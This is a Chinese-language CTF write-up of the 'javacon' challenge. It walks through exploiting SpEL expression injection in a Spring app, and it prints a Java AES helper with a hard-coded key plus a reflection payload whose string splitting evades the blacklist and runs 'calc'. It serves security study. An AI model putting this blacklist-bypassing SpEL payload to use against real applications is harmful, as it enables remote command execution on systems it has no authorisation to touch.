# javacon

贴一下如何调试jar文件

![image-20220110150643062](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220110150643062.png)

然后运行的时候

```
java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar challenge-0.0.1-SNAPSHOT.jar
```

正常访问即可。

## 0x01 源码

spring的配置

![image-20220110150748592](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220110150748592.png)

有黑名单过来和用户的账号密码，这个key我记得不错好像是`shiro`的。

![image-20220110151100449](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220110151100449.png)

spel的解析表达。百度知道有spel代码注入。

## 0x02 解题

`Runtime.getRuntime().exec("calc")` 这是

![image-20220110151708371](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220110151708371.png)

```java

package demo;

import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class exp {

    public exp() {
    }

    public static String encrypt(String key, String initVector, String value) {
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(1, skeySpec, iv);
            byte[] encrypted = cipher.doFinal(value.getBytes());
            return Base64.getUrlEncoder().encodeToString(encrypted);
        } catch (Exception var7) {
            var7.printStackTrace();
            return null;
        }
    }

    public static String decrypt(String key, String initVector, String encrypted) {
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(2, skeySpec, iv);
            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
            return new String(original);
        } catch (Exception var7) {
            var7.printStackTrace();
            return null;
        }
    }

    public static void main(String[] args){
        System.out.println(encrypt("c0dehack1nghere1","0123456789abcdef","ssss"));
    }
}

```

SPEL注入常用的姿势

```
引用其他对象:#{car}
引用其他对象的属性：#{car.brand}
调用其它方法 , 还可以链式操作：#{car.toString()}

其中属性名称引用还可以用符 号 如 ： 符号 如：符号如：{someProperty}
除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符：

#{T(java.lang.Math)}
1
#{T(java.lang.Math)}
T()运算符的结果会返回一个java.lang.Math类对象。
```

```java
System.out.println(encrypt("c0dehack1nghere1","0123456789abcdef","#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String)).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),\"calc\")}"));
```



![image-20220110160812808](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220110160812808.png)

结束了，就是一个反射拿到对象然后命令执行即可。

`T(String) == String.class`